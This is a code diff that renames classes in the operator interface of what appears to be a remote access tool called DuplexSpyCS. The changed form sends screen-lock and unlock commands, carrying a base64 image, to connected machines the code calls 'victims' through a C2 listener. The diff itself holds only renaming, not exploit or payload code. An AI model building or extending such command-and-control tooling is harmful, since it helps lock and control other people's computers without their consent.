@@ -15,14 +15,14 @@ namespace DuplexSpyCS
 {
     public partial class frmMultiLockScreen : Form
     {
-        public List<Victim> l_victim;
+        public List<clsVictim> l_victim;
 
         public frmMultiLockScreen()
         {
             InitializeComponent();
         }
 
-        private ListViewItem lviFindItemWithVictim(Victim v)
+        private ListViewItem lviFindItemWithVictim(clsVictim v)
         {
             ListViewItem item = null;
 
@@ -30,7 +30,7 @@ namespace DuplexSpyCS
             {
                 foreach (ListViewItem x in listView1.Items)
                 {
-                    if ((Victim)x.Tag == v)
+                    if ((clsVictim)x.Tag == v)
                     {
                         item = x;
                     }
@@ -40,7 +40,7 @@ namespace DuplexSpyCS
             return item;
         }
 
-        private void Received(Listener l, Victim v, string[] cmd)
+        private void Received(clsTcpListener l, clsVictim v, string[] cmd)
         {
             if (cmd[0] == "fun")
             {
@@ -65,7 +65,7 @@ namespace DuplexSpyCS
             }
         }
 
-        public void UpdateStatus(Victim v, string status)
+        public void UpdateStatus(clsVictim v, string status)
         {
             Invoke(new Action(() =>
             {
@@ -79,7 +79,7 @@ namespace DuplexSpyCS
 
         void setup()
         {
-            C2.listener.ReceivedDecoded += Received;
+            clsStore.listener.ReceivedDecoded += Received;
 
             for (int i = 0; i < l_victim.Count; i++)
             {
@@ -121,11 +121,11 @@ namespace DuplexSpyCS
                 return;
             }
 
-            string szImageBase64 = C2.ImageToBase64(szFileName);
+            string szImageBase64 = clsTools.ImageToBase64(szFileName);
 
             foreach (ListViewItem item in listView1.CheckedItems)
             {
-                Victim v = (Victim)item.Tag;
+                clsVictim v = (clsVictim)item.Tag;
                 v.SendCommand("fun|screen|lock|" + szImageBase64);
             }
         }
@@ -140,11 +140,11 @@ namespace DuplexSpyCS
                 return;
             }
 
-            string szImageBase64 = C2.ImageToBase64(szFileName);
+            string szImageBase64 = clsTools.ImageToBase64(szFileName);
 
             foreach (ListViewItem item in listView1.CheckedItems)
             {
-                Victim v = (Victim)item.Tag;
+                clsVictim v = (clsVictim)item.Tag;
                 v.SendCommand("fun|screen|ulock");
             }
         }
@@ -164,7 +164,7 @@ namespace DuplexSpyCS
 
         private void frmMultiLockScreen_FormClosed(object sender, FormClosedEventArgs e)
         {
-            C2.listener.ReceivedDecoded -= Received;
+            clsStore.listener.ReceivedDecoded -= Received;
         }
     }
 }
